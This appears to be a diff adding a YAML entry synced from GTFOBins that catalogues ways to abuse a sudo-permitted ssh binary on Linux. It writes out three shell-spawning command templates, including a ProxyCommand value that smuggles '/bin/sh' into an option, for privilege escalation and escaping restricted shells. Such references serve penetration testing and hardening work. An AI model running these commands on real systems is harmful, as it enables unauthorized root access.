@@ -1,0 +1,28 @@
+id: gtfobins/ssh/shell/sudo
+type: binary
+platform: linux
+name: ssh
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ssh localhost /bin/sh
+  comment: Reconnecting may help bypassing restricted shells.
+- template: ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+- template: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+  comment: Spawn the shell on the client, but still requires a successful remote connection.
+references:
+- https://gtfobins.github.io/gtfobins/ssh/
+tags:
+- linux
+- unix
+- gtfobins
